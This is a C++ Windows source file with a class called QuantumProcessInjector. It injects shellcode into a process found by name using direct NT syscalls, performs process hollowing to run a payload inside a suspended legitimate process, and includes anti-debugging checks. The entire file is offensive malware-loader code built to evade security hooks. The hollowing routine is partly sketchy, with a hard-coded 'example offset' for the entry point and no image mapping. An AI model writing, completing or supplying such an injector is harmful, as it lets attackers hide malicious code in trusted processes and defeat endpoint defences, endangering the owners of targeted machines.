#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <vector>
#include <algorithm>
#include <string>
#include <psapi.h>
#include <winternl.h>
#include <ntstatus.h>
#include <minmax.h>
#include <immintrin.h>
#include "direct_syscalls.h"

#pragma comment(lib, "ntdll.lib")

class QuantumProcessInjector {
public:
    DWORD find_pid(const wchar_t* process_name) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) return 0;

        if (!Process32FirstW(snapshot, &pe32)) {
            CloseHandle(snapshot);
            return 0;
        }

        do {
            if (_wcsicmp(pe32.szExeFile, process_name) == 0) {
                CloseHandle(snapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &pe32));

        CloseHandle(snapshot);
        return 0;
    }

    bool quantum_inject(DWORD pid, const std::vector<uint8_t>& shellcode) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) return false;

        // Allocate memory in the target process using syscalls
        void* pRemoteMem = nullptr;
        SIZE_T size = shellcode.size();
        NTSTATUS status = SysNtAllocateVirtualMemory(
            hProcess,
            &pRemoteMem,
            0,
            &size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (status != STATUS_SUCCESS || !pRemoteMem) {
            CloseHandle(hProcess);
            return false;
        }

        // Write shellcode using direct syscall
        status = SysNtWriteVirtualMemory(
            hProcess,
            pRemoteMem,
            shellcode.data(),
            shellcode.size(),
            nullptr
        );

        if (status != STATUS_SUCCESS) {
            SysNtFreeVirtualMemory(hProcess, &pRemoteMem, &size, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        // Change memory protection to RX
        ULONG oldProtect;
        status = SysNtProtectVirtualMemory(
            hProcess,
            &pRemoteMem,
            &size,
            PAGE_EXECUTE_READ,
            &oldProtect
        );

        if (status != STATUS_SUCCESS) {
            SysNtFreeVirtualMemory(hProcess, &pRemoteMem, &size, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        // Create thread using syscall
        HANDLE hThread = nullptr;
        status = SysNtCreateThreadEx(
            &hThread,
            THREAD_ALL_ACCESS,
            nullptr,
            hProcess,
            pRemoteMem,
            nullptr,
            FALSE,
            0,
            0,
            0,
            nullptr
        );

        if (status != STATUS_SUCCESS || !hThread) {
            SysNtFreeVirtualMemory(hProcess, &pRemoteMem, &size, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        WaitForSingleObject(hThread, INFINITE);

        // Cleanup
        CloseHandle(hThread);
        SysNtFreeVirtualMemory(hProcess, &pRemoteMem, &size, MEM_RELEASE);
        CloseHandle(hProcess);
        return true;
    }

    bool hollow_process(const wchar_t* target_process, const std::vector<uint8_t>& payload) {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        
        // Create suspended process
        if (!CreateProcessW(
            nullptr,
            const_cast<wchar_t*>(target_process),
            nullptr,
            nullptr,
            FALSE,
            CREATE_SUSPENDED,
            nullptr,
            nullptr,
            &si,
            &pi
        )) {
            return false;
        }

        // Get PEB address
        PROCESS_BASIC_INFORMATION pbi;
        NTSTATUS status = SysNtQueryInformationProcess(
            pi.hProcess,
            ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            nullptr
        );

        if (status != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        // Read entry point from PEB
        PEB peb;
        SIZE_T bytesRead;
        if (!ReadProcessMemory(
            pi.hProcess,
            pbi.PebBaseAddress,
            &peb,
            sizeof(peb),
            &bytesRead
        ) || bytesRead != sizeof(peb)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        // Get base address of target executable
        void* baseAddress = peb.ImageBaseAddress;

        // Unmap executable section
        status = SysNtUnmapViewOfSection(pi.hProcess, baseAddress);
        if (status != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        // Allocate new memory at original base address
        SIZE_T payloadSize = payload.size();
        void* newImageBase = baseAddress;
        status = SysNtAllocateVirtualMemory(
            pi.hProcess,
            &newImageBase,
            0,
            &payloadSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (status != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        // Write payload to allocated memory
        status = SysNtWriteVirtualMemory(
            pi.hProcess,
            newImageBase,
            payload.data(),
            payload.size(),
            nullptr
        );

        if (status != STATUS_SUCCESS) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        // Set new entry point
        CONTEXT context;
        context.ContextFlags = CONTEXT_INTEGER;
        GetThreadContext(pi.hThread, &context);
#ifdef _WIN64
        context.Rcx = reinterpret_cast<DWORD64>(newImageBase) + 0x1000; // Example offset
#else
        context.Eax = reinterpret_cast<DWORD>(newImageBase) + 0x1000;
#endif
        SetThreadContext(pi.hThread, &context);

        // Resume thread
        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }

private:
    bool detect_debugger() {
        return IsDebuggerPresent() || check_hardware_breakpoints();
    }

    bool check_hardware_breakpoints() {
        CONTEXT context;
        HANDLE hThread = GetCurrentThread();
        context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        GetThreadContext(hThread, &context);

        return context.Dr0 || context.Dr1 || context.Dr2 || context.Dr3;
    }
};